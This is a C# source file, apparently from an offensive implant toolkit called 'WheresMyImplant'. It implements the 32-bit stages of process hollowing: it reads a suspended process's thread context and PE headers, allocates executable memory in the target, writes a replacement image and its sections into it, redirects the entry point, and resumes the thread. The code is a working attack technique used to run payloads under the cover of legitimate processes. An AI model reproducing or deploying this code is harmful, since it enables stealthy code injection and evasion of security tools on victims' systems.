using System;
using System.Runtime.InteropServices;

using Unmanaged.Headers;
using Unmanaged.Libraries;


namespace WheresMyImplant
{
    partial class HollowProcess
    {
        Winnt.CONTEXT context32;
        Winnt._IMAGE_NT_HEADERS imageNTHeader32;
        Winnt._IMAGE_NT_HEADERS targetNTHeader32;

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private Boolean GetContext32()
        {
            context32 = new Winnt.CONTEXT()
            {
                ContextFlags = Winnt.CONTEXT_FLAGS.CONTEXT_FULL
            };
            try
            {
                WriteOutputNeutral("Getting Thread Context");
                kernel32.IsWow64Process(lpProcessInformation.hProcess, out Boolean isWow64);
                if (isWow64)
                {
                    kernel32.Wow64GetThreadContext(lpProcessInformation.hThread, ref context32);
                }
                else
                {
                    kernel32.GetThreadContext(lpProcessInformation.hThread, ref context32);
                }
            }
            catch (Exception)
            {
                WriteOutputBad("GetThreadContext (32) Failed");
            }

            WriteOutputNeutral(String.Format("EAX Address: 0x{0}", context32.Eax.ToString("X4")));
            WriteOutputNeutral(String.Format("EBX Address: 0x{0}", context32.Ebx.ToString("X4")));
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private Boolean ReadNTHeaders32()
        {
            Int32 nSize = Marshal.SizeOf(typeof(Winnt._IMAGE_NT_HEADERS64));
            IntPtr buffer = Marshal.AllocHGlobal(nSize);
            UInt32 numberBytesRead = 0;
            try
            {
                if (!kernel32.ReadProcessMemory64(
                    lpProcessInformation.hProcess,
                    (UInt64)targetImageBaseAddress.ToInt64(),
                    buffer,
                    (UInt32)nSize,
                    ref numberBytesRead))
                {
                    return false;
                }
            }
            catch (Exception)
            {
                return false;
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
            imageNTHeader32 = (Winnt._IMAGE_NT_HEADERS)Marshal.PtrToStructure(buffer, typeof(Winnt._IMAGE_NT_HEADERS));
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Allocate memory after image is unmapped
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean RemapImage32()
        {
            WriteOutputNeutral(String.Format("Allocating 0x{0} bytes at 0x{1} - 0x{2}",
                image.Length.ToString("X4"),
                targetImageBaseAddress.ToString("X4"),
                (image.Length + targetImageBaseAddress.ToInt64()).ToString("X4")));

            allocatedTargetAddress = kernel32.VirtualAllocEx(
                lpProcessInformation.hProcess,
                new IntPtr(imageNTHeader32.OptionalHeader.ImageBase),
                imageNTHeader32.OptionalHeader.SizeOfImage,
                kernel32.MEM_COMMIT | kernel32.MEM_RESERVE,
                Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READWRITE);

            if (IntPtr.Zero == allocatedTargetAddress)
            {
                WriteOutputBad("VirtualAllocEx failed");
                return false;
            }

            WriteOutputNeutral(String.Format("Source Image Base: 0x{0}", imageNTHeader32.OptionalHeader.ImageBase.ToString("X4")));
            ////////////////////////////////////////////////////////////////////////////////
            UInt32 bytesWritten = 0;
            if (!kernel32.WriteProcessMemory(
                lpProcessInformation.hProcess,
                allocatedTargetAddress,
                imagePtr,
                imageNTHeader32.OptionalHeader.SizeOfHeaders,
                ref bytesWritten))
            {
                WriteOutputBad("WriteProcessMemory failed");
                return false;
            }
            WriteOutputGood(String.Format("Headers Copied: {0} of {1} bytes", bytesWritten, imageNTHeader32.OptionalHeader.SizeOfHeaders));

            ////////////////////////////////////////////////////////////////////////////////
            for (Int32 i = 0; i < imageNTHeader32.FileHeader.NumberOfSections; i++)
            {
                IntPtr offset = new IntPtr(
                    imagePtr.ToInt64() +
                    imageDosHeader.e_lfanew +
                    Marshal.SizeOf(typeof(Winnt._IMAGE_NT_HEADERS)) +
                    (Marshal.SizeOf(typeof(Winnt._IMAGE_SECTION_HEADER)) * i));
                var imageSectionHeader = (Winnt._IMAGE_SECTION_HEADER)Marshal.PtrToStructure(offset, typeof(Winnt._IMAGE_SECTION_HEADER));

                WriteOutputGood(String.Format("Writing Section {0}", new String(imageSectionHeader.Name)));
                bytesWritten = 0;
                if (!kernel32.WriteProcessMemory(
                    lpProcessInformation.hProcess,
                    new IntPtr(allocatedTargetAddress.ToInt64() + imageSectionHeader.VirtualAddress),
                    new IntPtr(imagePtr.ToInt64() + imageSectionHeader.PointerToRawData),
                    imageSectionHeader.SizeOfRawData,
                    ref bytesWritten))
                {
                    WriteOutputBad("WriteProcessMemory failed");
                    return false;
                }
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Unmaps the target image from memory allocs a more memory
        // http://www.rohitab.com/discuss/topic/43738-getthreadcontext-is-failing/
        // sizeof(CONTEXT) = 716
        // offsetof(Ebx) = 164 - PEB
        // offsetof(Eax) = 176 - Entry Point
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ResumeProcess32(Boolean wait)
        {
            WriteOutputNeutral(String.Format("Updating Thread Context"));

            context32.Eax = (UInt32)allocatedTargetAddress.ToInt64() + imageNTHeader32.OptionalHeader.AddressOfEntryPoint;
            WriteOutputGood(String.Format("Updated Entry Point Address: 0x{0}", context32.Eax.ToString("X4")));

            IntPtr lpContext = Marshal.AllocHGlobal(Marshal.SizeOf(context32));
            Marshal.StructureToPtr(context32, lpContext, false);
            kernel32.SetThreadContext(lpProcessInformation.hThread, lpContext);

            WriteOutputNeutral("Resuming Main Thread");
            kernel32.ResumeThread(lpProcessInformation.hThread);

            if (wait)
            {
                kernel32.WaitForSingleObject(lpProcessInformation.hProcess, 0xFFFFFFFF);
            }
            return true;
        }
    }
}
